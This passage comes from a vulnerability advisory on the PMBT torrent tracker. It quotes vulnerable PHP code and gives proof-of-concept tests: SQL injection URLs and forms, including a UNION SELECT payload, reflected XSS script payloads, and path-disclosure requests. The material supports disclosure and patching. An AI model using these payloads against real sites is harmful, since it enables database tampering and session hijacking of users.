+PHP script "problems.php" line 62:
+------------------------[ source code start ]----------------------------------
+if(isset($_POST['delete']) AND $_POST['delete']=='Delete')
+{
+foreach($t as $tid=>$action)
+{
+$db->sql_query("DELETE FROM `".$db_prefix."_helpdesk` WHERE `id` = ".$tid."
+  LIMIT 1");
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/problems.php" method="post">
+<input type="hidden" name="delete" value="Delete">
+<input type="hidden" name="t[waraxe]" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+18. SQL Injection in "polls.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "pollid"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "polls.php" line 38:
+------------------------[ source code start ]----------------------------------
+$pollid = $_GET["pollid"];
+...
+$db->sql_query( "DELETE FROM ".$db_prefix."_pollanswers WHERE pollid = $pollid") or sqlerr();
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/polls.php?action=delete&sure=1&pollid=waraxe
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+19. SQL Injection in "scrape-external.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "tracker"
+Preconditions:
+ 1. logged in as user
+ 2. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "scrape-external.php" line 34:
+------------------------[ source code start ]----------------------------------
+$url2 =  $_GET["tracker"];
+...
+$sql = "SELECT url, support FROM ".$db_prefix."_trackers
+    WHERE url = '".$url2."' LIMIT 1;";
+$res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/scrape-external.php?id=1&tracker='UNION+SELECT+@@version,'1
+
+
+###############################################################################
+20. SQL Injection in "shoutboxarchive.php"
+###############################################################################
+
+Reason: uninitialized variable "$lookforcount"
+Attack vector: user-supplied parameter "lookforcount"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "shoutboxarchive.php" line 77:
+------------------------[ source code start ]----------------------------------
+if(isset($search))
+{
+...
+  $lookforcount = $searchtime.$searchword.$uidsearch." AND ";
+}
+...
+$totsql = "SELECT COUNT(*) as tot FROM ".$db_prefix."_shouts
+ WHERE ".$lookforcount."(id_to = '0' OR id_to = '".$user->id."');";
+$totres = $db->sql_query($totsql)or btsqlerror($totsql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/shoutboxarchive.php?lookforcount=waraxe=1%23
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+21. SQL Injection in "slove.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameters "tid", "cid", "rid" and "id"
+Preconditions:
+ 1. magic_quotes_gpc=off (for parameters "cid", "rid" and "id")
+Result: attacker can manipulate database queries
+
+ 
+PHP script "slove.php" line 41:
+------------------------[ source code start ]----------------------------------
+$db->sql_query("UPDATE `".$db_prefix."_helpdesk` SET  `category`
+ = '".$cid."' WHERE `".$db_prefix."_helpdesk`.`id` =".$tid." LIMIT 1 ;");
+...
+$db->sql_query("UPDATE `".$db_prefix."_helpdesk` SET `helper` = '$rid' WHERE 
+ `".$db_prefix."_helpdesk`.`id` =".$tid." LIMIT 1 ;");
+if(isset($trans_alert))$db->sql_query("INSERT INTO 
+ ".$db_prefix."_private_messages (sent, sender, recipient, subject, text) 
+  VALUES (NOW(), 0, $rid, 'Help Desk', '$msg')") ;
+...
+$sql="SELECT * FROM ".$db_prefix."_helpdesk WHERE id='".$id."'";
+$result=$db->sql_query($sql);
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://pmbt/slove.php?cid=1&tid=waraxe
+http://pmbt/slove.php?cid=war'axe&tid=1
+http://pmbt/slove.php?tid=123&rid=war'axe
+http://pmbt/slove.php?trans_alert=1&rid=war'axe
+http://pmbt/slove.php?id=war'axe
+
+
+###############################################################################
+22. SQL Injection in "takehelpans.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameters "id" and "newstatus"
+Preconditions:
+ 1. magic_quotes_gpc=off (for parameter "newstatus")
+Result: attacker can manipulate database queries
+
+ 
+PHP script "takehelpans.php" line 34:
+------------------------[ source code start ]----------------------------------
+if(isset($reopen))
+{
+$db->sql_query("UPDATE `".$db_prefix."_helpdesk` SET `solved` = 'no' WHERE
+ `id` =".$id." LIMIT 1 ;");
+...
+if(isset($change_status)){
+$db->sql_query("UPDATE `".$db_prefix."_helpdesk` SET `status` = 
+ '".$newstatus."' WHERE `id` =".$id." LIMIT 1 ;");
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://pmbt/takehelpans.php?reopen=1&id=waraxe
+http://pmbt/takehelpans.php?change_status=1&newstatus=war'axe
+
+
+###############################################################################
+23. SQL Injection in "takeoffedit.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameters "id" and "category"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "takeoffedit.php" line 35:
+------------------------[ source code start ]----------------------------------
+$id = $_POST["id"];
+...
+$cat = $_POST["category"];
+...
+$sql = "UPDATE ".$db_prefix."_offers SET category='".$cat."',
+ name='".$db->sql_escape($name)."', descr='".$db->sql_escape($msg)."' 
+ where id='".$id."'";
+$db->sql_query($sql)or btsqlerror($sql); 
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/takeoffedit.php" method="post">
+<input type="hidden" name="category" value="war'axe">
+<input type="hidden" name="id" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe', name='', descr=''
+where id='1'' at line 1
+
+
+###############################################################################
+24. SQL Injection in "takerequest.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "requesttitle"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+
+PHP script "takerequest.php" line 36:
+------------------------[ source code start ]----------------------------------
+$requesttitle = $_POST["requesttitle"];
+$request = $requesttitle;
+...
+$db->sql_query("INSERT INTO ".$db_prefix."_requests (hits,userid, cat, request,
+ descr, added) VALUES(1, '".$user->id."', '".$cat."', '" . $request . "',
+ '".$msg."', NOW())")or die(mysql_error());
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/takerequest.php" method="post">
+<input type="hidden" name="requesttitle" value="war'axe">
+<input type="hidden" name="cat" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe', '', NOW())' at
+line 1
+
+
+###############################################################################
+25. SQL Injection in "takethankyou.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "id"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "takethankyou.php" line 36:
+------------------------[ source code start ]----------------------------------
+$res = $db->sql_query("SELECT id FROM ".$db_prefix."_torrents WHERE id = $id");
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/takethankyou.php?id=waraxe
+
+
+###############################################################################
+26. SQL Injection in "torrents.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "type"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "torrents.php" line 89:
+------------------------[ source code start ]----------------------------------
+$sort =  (isset($_GET["sort"])) ? $_GET["sort"] : '';
+$type =  (isset($_GET["type"])) ? $_GET["type"] : '';
+...
+if ($sort == 1) $orderby = " ORDER BY ".$db_prefix."_torrents.name $type,  ";
+...
+$sql = "SELECT ".$db_prefix."_torrents.*, IF(".$db_prefix."_torrents.numratings
+...
+ ".$db_prefix."_torrents.owner = U.id WHERE ".$viswhere.$catwhere.$passwhere.
+ $orderby.$db_prefix."_torrents.added DESC LIMIT ".$from.",
+ ".$torrent_per_page.";";
+$res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/torrents.php?sort=1&type=waraxe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to
+your MySQL server version for the right syntax to use near 'waraxe,
+torrent_torrents.added DESC LIMIT 0,10' at line 1
+
+
+###############################################################################
+27. SQL Injection in "viewsnatches.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "id"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "viewsnatches.php" line 115:
+------------------------[ source code start ]----------------------------------
+$sql = ("select count(".$db_prefix."_snatched.id) from ".$db_prefix."_snatched
+ inner join  ".$db_prefix."_users on ".$db_prefix."_snatched.userid =
+ ".$db_prefix."_users.id inner join ".$db_prefix."_torrents on 
+ ".$db_prefix."_snatched.torrentid = ".$db_prefix."_torrents.id WHERE 
+ ".$db_prefix."_snatched.torrentid =". $_GET[id]) or die(mysql_error());
+$res3 = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/viewsnatches.php?id=waraxe
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+28. SQL Injection in "votesview.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "requestid"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "votesview.php" line 35:
+------------------------[ source code start ]----------------------------------
+$requestid = $_GET[requestid];
+
+$res2 = $db->sql_query("select count(".$db_prefix."_addedrequests.id) from 
+".$db_prefix."_addedrequests inner join ".$db_prefix."_users on 
+".$db_prefix."_addedrequests.userid  = ".$db_prefix."_users.id inner join 
+".$db_prefix."_requests on ".$db_prefix."_addedrequests.requestid = 
+".$db_prefix."_requests.id WHERE ".$db_prefix."_addedrequests.requestid 
+=$requestid") or print(mysql_error());;
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/votesview.php?requestid=waraxe
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+29. Reflected XSS in "ban.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "reson"
+Preconditions: none
+
+Test:
+
+http://pmbt/ban.php?reson=<script>alert(123);</script>
+
+
+###############################################################################
+30. Reflected XSS in "bbcode.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied POST parameter "test"
+Preconditions: none
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/bbcode.php" method="post">
+<input type="hidden" name="test" value="<script>alert(123);</script>">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+31. Reflected XSS in "contactstaff.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "returnto"
+Preconditions: none
+
+Test:
+
+http://pmbt/contactstaff.php?returnto="><script>alert(123);</script>
+
+
+###############################################################################
+32. Reflected XSS in "faq.php"
+###############################################################################
+
+Reason: uninitialized variable "$faq_categ"
+Attack vector: user-supplied parameter "faq_categ"
+Preconditions: none
+
+Test:
+
+http://pmbt/faq.php?faq_categ[0][title]=<script>alert(123);</script>
+&faq_categ[0][flag]=1
+
+
+###############################################################################
+33. Reflected XSS in "keno.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameters "n1","n2","n3","n4","n5","n6","n7",
+ "n8","n9","n10","n11","n12","n13","n14","n15","n16","n17","n18","n19","n20"
+Preconditions: none
+
+Test:
+
+http://pmbt/keno.php?n1="><script>alert(123);</script>
+http://pmbt/keno.php?n20="><script>alert(123);</script>
+
+
+###############################################################################
+34. Reflected XSS in "makepoll.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameters "returnto" and "poll"
+Preconditions: none
+
+Test:
+
+http://pmbt/makepoll.php?returnto=><script>alert(123);</script>
+http://pmbt/makepoll.php?poll[id]=><script>alert(123);</script>
+
+
+###############################################################################
+35. Reflected XSS in "modrules.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "res"
+Preconditions: none
+
+Test:
+
+http://pmbt/modrules.php?act=newsect&
+res[text]=&lt;/textarea&gt;<script>alert(123);</script>
+
+
+###############################################################################
+36. Reflected XSS in "polls.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameters "pollid" and "returnto"
+Preconditions: none
+
+Test:
+
+http://pmbt/polls.php?action=delete&pollid=><script>alert(123);</script>
+http://pmbt/polls.php?action=delete&returnto=><script>alert(123);</script>
+
+
+###############################################################################
+37. Reflected XSS in "popuptest.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "text"
+Preconditions: none
+
+Test:
+
+http://pmbt/popuptest.php?text=<script>alert(123);</script>
+
+
+###############################################################################
+38. Reflected XSS in "redirect.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "url"
+Preconditions: none
+
+Test:
+
+http://pmbt/redirect.php?url='><script>alert(123);</script>
+
+
+###############################################################################
+39. Reflected XSS in "search.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "search"
+Preconditions: none
+
+Test:
+
+http://pmbt/search.php?search="><script>alert(123);</script>
+
+
+###############################################################################
+40. Reflected XSS in "user.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameter "returnto"
+Preconditions: none
+
+Test:
+
+http://pmbt/user.php?op=loginconfirm&returnto="><script>alert(123);</script>
+
+
+###############################################################################
+41. Reflected XSS in "ajax.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied parameters "torrent", "password", "browsemenu",
+ "pagemenu" and "torrentrating"
+Preconditions: none
+
+Tests:
+
+http://pmbt/ajax.php?op=view_coments_page&torrent="></iframe><script>alert(123);</script>
+http://pmbt/ajax.php?op=view_coments_page&password="></iframe><script>alert(123);</script>
+http://pmbt/ajax.php?op=view_details_page&torrent=><script>alert(123);</script>
+http://pmbt/ajax.php?op=view_details&torrent=><script>alert(123);</script>
+http://pmbt/ajax.php?op=member_search&search=z&browsemenu=<script>alert(123);</script>
+http://pmbt/ajax.php?op=member_search&search=z&pagemenu=<script>alert(123);</script>
+http://pmbt/ajax.php?op=view_rate_page&torrentrating=<script>alert(123);</script>
+
+
+###############################################################################
+42. Full Path Disclosure in multiple scripts
+###############################################################################
+
+Tests:
+
+http://pmbt/actb.php
+
+Fatal error: Call to a member function sql_query() on a non-object
+in C:\apache2www\actb.php on line 47
+
+
+http://pmbt/findnotconnectable.php?action=sendpm
+
+Fatal error: Call to undefined function stdhead()
+in C:\apache2www\findnotconnectable.php on line 58
+
+
+http://pmbt/torrents-needseed.php
+
+Fatal error: Call to a member function sql_query() on a non-object
+in C:\apache2www\torrents-needseed.php on line 35
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
